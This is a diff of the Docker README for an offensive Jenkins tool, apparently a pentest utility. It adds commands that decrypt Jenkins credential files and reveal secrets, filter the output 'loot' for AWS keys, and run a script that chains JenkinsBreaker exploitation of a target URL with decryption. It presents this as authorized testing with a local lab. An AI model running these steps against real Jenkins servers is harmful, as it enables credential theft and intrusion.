@@ -2,14 +2,13 @@
 
 ## Overview
 
-offsec-jenkins now supports Docker for portable, isolated execution across any platform.
+The tool supports Docker for portable execution across platforms without requiring local Python installation.
 
-**Key Features**:
-- ✅ No local Python installation required
-- ✅ Consistent environment across Windows/Linux/macOS
-- ✅ Volume mounts for Jenkins file access
-- ✅ No hardcoded credentials (user-specified only)
-- ✅ CTF and red team optimized
+**Features**:
+- Isolated container environment
+- Volume mounts for Jenkins file access
+- Environment variable configuration (no hardcoded credentials)
+- Compatible with Windows/Linux/macOS
 
 ---
 
@@ -28,7 +27,7 @@ docker build -t offsec-jenkins:latest .
 
 ### 2. Prepare Jenkins Files
 
-Place your extracted Jenkins files in `./jenkins_files/`:
+Place extracted Jenkins files in `./jenkins_files/`:
 ```
 jenkins_files/
 ├── master.key
@@ -43,7 +42,7 @@ jenkins_files/
 docker-compose run --rm offsec-jenkins --path /data
 ```
 
-**Revealed secrets** (CTF/authorized testing):
+**Revealed secrets** (authorized testing):
 ```bash
 docker-compose run --rm offsec-jenkins --path /data --reveal-secrets
 ```
@@ -57,7 +56,7 @@ docker-compose run --rm offsec-jenkins \
   --force
 ```
 
-Output files are written to `./outputs/` on your host machine.
+Output files are written to `./outputs/` on the host machine.
 
 ---
 
@@ -74,16 +73,15 @@ cp extracted/credentials.xml jenkins_files/
 docker-compose run --rm offsec-jenkins --path /data
 ```
 
-### Example 2: CTF Speed Run
+### Example 2: Export to JSON
 ```bash
-# Quick decrypt and export
 docker-compose run --rm offsec-jenkins \
   --path /data \
   --export-json /outputs/loot.json \
   --reveal-secrets \
   --force
 
-# Analyze output
+# Parse output
 cat outputs/loot.json | jq '.[] | select(.decrypted | contains("AKIA"))'
 ```
 
@@ -98,7 +96,6 @@ docker-compose run --rm offsec-jenkins \
 
 ### Example 4: Recursive Scanning
 ```bash
-# Scan entire directory tree
 docker-compose run --rm offsec-jenkins \
   --scan-dir /data \
   --export-json /outputs/all_secrets.json \
@@ -121,8 +118,6 @@ docker-compose run --rm offsec-jenkins \
   --export-csv /outputs/report.csv \
   --reveal-secrets \
   --force
-
-# Open in Excel or LibreOffice
 ```
 
 ---
@@ -165,7 +160,7 @@ docker run --rm \
   --path /data --export-json /outputs/loot.json --reveal-secrets
 ```
 
-### CTF One-Liner
+### Filtering Output
 
 ```bash
 docker run --rm \
@@ -176,9 +171,9 @@ docker run --rm \
 
 ---
 
-## Jenkins Lab (Optional Testing)
+## Jenkins Lab (Testing)
 
-The docker-compose includes an optional Jenkins lab for testing. **No credentials are hardcoded**.
+The docker-compose configuration includes an optional Jenkins instance for validation. No credentials are hardcoded.
 
 ### Start Jenkins Lab
 
@@ -194,20 +189,20 @@ Access Jenkins at http://localhost:8080
    ```bash
    docker exec jenkins-lab cat /var/jenkins_home/secrets/initialAdminPassword
    ```
-3. Complete setup wizard and create admin user with YOUR chosen credentials
+3. Complete setup wizard and configure admin credentials
 
 ### Configure Test Credentials
 
-Once logged in:
-1. Go to **Manage Jenkins** → **Manage Credentials**
-2. Add credentials (AWS keys, GitHub tokens, SSH keys, passwords)
-3. Extract Jenkins files for testing:
+After login:
+1. Navigate to **Manage Jenkins** → **Manage Credentials**
+2. Add test credentials (AWS keys, GitHub tokens, SSH keys, passwords)
+3. Extract Jenkins files:
    ```bash
    docker cp jenkins-lab:/var/jenkins_home/secrets/master.key jenkins_files/
    docker cp jenkins-lab:/var/jenkins_home/secrets/hudson.util.Secret jenkins_files/
    docker cp jenkins-lab:/var/jenkins_home/credentials.xml jenkins_files/
    ```
-4. Test decryption:
+4. Run decryption:
    ```bash
    docker-compose run --rm offsec-jenkins --path /data --reveal-secrets
    ```
@@ -218,37 +213,33 @@ Once logged in:
 # Stop Jenkins lab
 docker-compose --profile lab down
 
-# Remove all data (DESTRUCTIVE)
+# Remove volumes (destructive)
 docker-compose --profile lab down -v
 ```
 
 ---
 
-## Security Notes
+## Security Considerations
 
-### No Hardcoded Credentials ✅
+### Credential Handling
 
-Unlike some Jenkins lab setups, this Docker configuration:
-- ❌ Does NOT hardcode admin/admin
-- ❌ Does NOT auto-configure weak credentials
-- ✅ Requires users to set their own credentials
-- ✅ Follows security best practices
+This configuration does not include default credentials. Users must configure credentials manually during Jenkins setup.
 
-### OPSEC Considerations
+### OPSEC
 
 **Default Redaction**:
 - Secrets are redacted by default
-- Must explicitly use `--reveal-secrets` flag
-- Prevents accidental exposure in logs/screenshots
+- Requires explicit `--reveal-secrets` flag
+- Prevents accidental exposure in logs
 
 **Read-Only Mounts**:
-- Input files mounted as read-only (`:ro`)
-- Tool cannot modify original Jenkins files
-- Safe for forensic analysis
+- Input files mounted read-only (`:ro`)
+- Original Jenkins files remain unmodified
+- Suitable for forensic analysis
 
-**Isolated Environment**:
-- Decryption happens in isolated container
-- No host system dependencies
+**Container Isolation**:
+- Decryption occurs in isolated container
+- No host system dependencies required
 - Clean removal with `docker-compose down`
 
 ---
@@ -257,9 +248,8 @@ Unlike some Jenkins lab setups, this Docker configuration:
 
 ### Permission Denied on Output Files
 
-If output files have wrong permissions:
+Run with specific user ID:
 ```bash
-# Run with user ID
 docker run --rm \
   -v $(pwd)/jenkins_files:/data:ro \
   -v $(pwd)/outputs:/outputs \
@@ -270,22 +260,22 @@ docker run --rm \
 
 ### Files Not Found
 
-Ensure files are in the correct location:
+Verify volume mount:
 ```bash
-# Check volume mount
 docker run --rm -v $(pwd)/jenkins_files:/data:ro alpine ls -la /data
+```
 
-# Should show:
-# master.key
-# hudson.util.Secret
-# credentials.xml
+Expected output:
+```
+master.key
+hudson.util.Secret
+credentials.xml
 ```
 
 ### Docker Not Available
 
-If Docker is not installed:
+Use native Python:
 ```bash
-# Use native Python instead
 python decrypt.py --path jenkins_files --reveal-secrets
 ```
 
@@ -293,20 +283,20 @@ python decrypt.py --path jenkins_files --reveal-secrets
 
 ## Integration with JenkinsBreaker
 
-### Complete Workflow
+### Workflow
 
-**Step 1**: Exploit Jenkins with JenkinsBreaker
+**Step 1**: Extract files with JenkinsBreaker
 ```bash
 cd JenkinsBreaker
 python3 JenkinsBreaker.py --url http://target:8080 --extract-all
 ```
 
-**Step 2**: Copy files to Docker volume
+**Step 2**: Copy to Docker volume
 ```bash
 cp extracted/* ../offsec-jenkins/jenkins_files/
 ```
 
-**Step 3**: Decrypt with Docker
+**Step 3**: Decrypt
 ```bash
 cd ../offsec-jenkins
 docker-compose run --rm offsec-jenkins \
@@ -316,14 +306,14 @@ docker-compose run --rm offsec-jenkins \
   --force
 ```
 
-**Step 4**: Analyze results
+**Step 4**: Analyze
 ```bash
 cat outputs/loot.json | jq '.'
 ```
 
-### Automated Script
+### Automation Script
 
-Create `exploit_and_decrypt.sh`:
+`exploit_and_decrypt.sh`:
 ```bash
 #!/bin/bash
 TARGET=$1
@@ -333,11 +323,9 @@ if [ -z "$TARGET" ]; then
   exit 1
 fi
 
-# Exploit
 cd JenkinsBreaker
 python3 JenkinsBreaker.py --url "$TARGET" --extract-all --output ../offsec-jenkins/jenkins_files
 
-# Decrypt
 cd ../offsec-jenkins
 docker-compose run --rm offsec-jenkins \
   --path /data \
@@ -345,7 +333,7 @@ docker-compose run --rm offsec-jenkins \
   --reveal-secrets \
   --force
 
-echo "[+] Decryption complete. Check outputs/ directory."
+echo "Decryption complete. Check outputs/ directory."
 ```
 
 Usage:
@@ -360,35 +348,18 @@ chmod +x exploit_and_decrypt.sh
 
 | Platform | Status | Notes |
 |----------|--------|-------|
-| **Linux** | ✅ Full support | Native Docker |
-| **macOS** | ✅ Full support | Docker Desktop |
-| **Windows** | ✅ Full support | Docker Desktop or WSL2 |
-| **WSL2** | ✅ Full support | Use Linux Docker or Windows Docker |
-| **Kali Linux** | ✅ Full support | Native Docker |
-| **Parrot OS** | ✅ Full support | Native Docker |
+| Linux | Supported | Native Docker |
+| macOS | Supported | Docker Desktop |
+| Windows | Supported | Docker Desktop or WSL2 |
+| WSL2 | Supported | Linux or Windows Docker |
+| Kali Linux | Supported | Native Docker |
+| Parrot OS | Supported | Native Docker |
 
 ---
 
-## Performance
+## Performance Notes
 
-Docker overhead is minimal:
-- **Build time**: ~30 seconds
-- **Startup time**: <1 second
-- **Decryption speed**: Identical to native Python
-- **Memory usage**: ~50MB container overhead
-
-For CTF competitions, Docker is fast enough for real-time operations.
-
----
-
-## Summary
-
-✅ **Docker support implemented**  
-✅ **No hardcoded credentials** (user-specified only)  
-✅ **Full CLI feature support**  
-✅ **Volume mounts for flexibility**  
-✅ **Cross-platform compatibility**  
-✅ **CTF and red team optimized**  
-✅ **JenkinsBreaker integration ready**
-
-The tool maintains its offline-first, security-focused design while adding Docker portability.
+- Build time: ~30 seconds
+- Container startup: <1 second
+- Decryption speed: Equivalent to native Python
+- Memory overhead: ~50MB
